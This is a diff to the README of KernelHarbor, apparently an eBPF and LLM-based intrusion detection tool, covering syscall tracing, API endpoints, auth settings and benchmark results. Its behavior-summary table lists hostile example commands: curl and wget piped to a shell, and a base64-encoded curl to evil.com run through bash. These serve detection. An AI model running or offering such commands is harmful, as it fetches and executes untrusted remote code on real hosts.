@@ -36,7 +36,7 @@ https://github.com/user-attachments/assets/99ef4a91-b9aa-411d-b847-0af310006de9
 
 | File | Description |
 |------|-------------|
-| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
+| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` and `sys_enter_execveat` |
 | `open-tracer.bpf.c` | Hooks `sys_enter_open` |
 | `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with directory path resolution via `bpf_d_path` |
 | `connect-tracer.bpf.c` | Hooks `sys_enter_connect` |
@@ -103,11 +103,11 @@ curl -X POST http://localhost:8080/analyze \
 
 ### Event Flow
 
-1. **eBPF Tracers** hook kernel syscalls (`execve`, `open`, `connect`)
+1. **eBPF Tracers** hook kernel syscalls (`execve`, `execveat`, `open`, `openat`, `connect`)
 2. **Ring buffer** passes events to user-space Go program
 3. **gRPC** sends events to the analysis service
 4. **Heuristic and correlation rules** run on ingest and return `KILL_PID` / `BLOCK_IP` / `ALERT` inline
-5. **Elasticsearch** stores events with behavior embeddings
+5. **Elasticsearch** stores every event; events sent for LLM review also get a behavior embedding
 6. **Async workers** batch events per host and send them to Ollama (all `execve`/`connect`, but `open`/`openat` only for sensitive paths such as `/etc`, `/tmp`, `.ssh`), with process ancestry, correlation chains, and similar past events from the same host as context
 7. **LLM** returns an advisory verdict. Malicious with confidence >= 0.7 becomes an `ALERT`
 
@@ -157,9 +157,9 @@ Events are converted to behavior summaries for vector search:
 
 | Raw Command | Behavior Summary |
 |-------------|-----------------|
-| `curl x \| bash` | `execve remote_code_execution image:curl` |
-| `wget y \| sh` | `execve remote_code_execution image:wget` |
-| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i" \| base64 -d \| bash` | `execve encoded_command image:base64` |
+| `curl x \| bash` | `event_type:execve remote_code_execution user:root image:curl` |
+| `wget y \| sh` | `event_type:execve remote_code_execution user:root image:wget` |
+| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i' \| base64 -d \| bash` | `event_type:execve encoded_command user:root image:base64` |
 
 Similar past events from the same host are added to the prompt as context. They carry no verdict, so they show what has happened before on the host, not whether it was malicious.
 
@@ -168,6 +168,7 @@ Similar past events from the same host are added to the prompt as context. They 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
 | `/health` | GET | Health check |
+| `/ready` | GET | Reports whether Elasticsearch and Ollama clients are configured |
 | `/ingest` | POST | Ingest events |
 | `/ingest/batch` | POST | Ingest batched events |
 | `/analyze` | POST | Query AI analysis |
@@ -201,18 +202,22 @@ Response:
 |----------|---------|-------------|
 | `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch addresses |
 | `ES_INDEX` | `kb-events` | Events index |
+| `ES_USERNAME` | | Elasticsearch username |
+| `ES_PASSWORD` | | Elasticsearch password |
 | `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
 | `OLLAMA_MODEL` | `qwen2.5:1.5b` | Analysis model. Set to your model of choice |
-| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
 | `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
 | `GRPC_ADDRESS` | `:9090` | gRPC server address |
 | `HTTP_ADDRESS` | `:8080` | HTTP server address |
+| `GRPC_AUTH_TOKEN` | | Shared secret for gRPC and HTTP (`Authorization: Bearer`); `/health` and `/ready` are exempt. Set the same value on the agent |
 
 ### Agent (Tracer)
 
 | Variable | Description |
 |----------|-------------|
 | `GRPC_ADDRESS` | gRPC server address to send events (e.g., `localhost:9090`) |
+| `HTTP_ADDRESS` | HTTP server address, used when `GRPC_ADDRESS` is unset |
+| `GRPC_AUTH_TOKEN` | Shared secret; must match the analysis service |
 
 ## Testing
 
@@ -259,7 +264,11 @@ KernelHarbor/
 ├── proto/              # Protocol Buffer definitions
 │   └── agent.proto
 ├── scripts/
-│   └── bench.sh        # Benchmark runner
+│   ├── bench.sh             # Benchmark runner
+│   ├── check-prereqs.sh     # Checks ES, Ollama, gRPC; starts ES in Docker if down
+│   ├── e2e-test.sh          # E2E tests (needs ES + Ollama + analysis)
+│   ├── integration-test.sh  # Integration tests (needs root + eBPF + ES)
+│   └── run-analysis.sh      # Runs analysis, logs to analysis.log
 ├── plan.md             # Original design document
 └── README.md           # This file
 ```
@@ -294,10 +303,10 @@ NOTE: Because this was not tested against a large sample size. True accuracy may
 
 | Metric | Value |
 |--------|-------|
-| Accuracy | 85.78% |
+| Accuracy | 93.12% |
 | Precision | 100.00% |
-| Recall | 70.48% |
-| F1 Score | 82.68% |
+| Recall | 85.71% |
+| F1 Score | 92.31% |
 | False Positive Rate | 0.00% |
 
 #### Heuristic Patterns
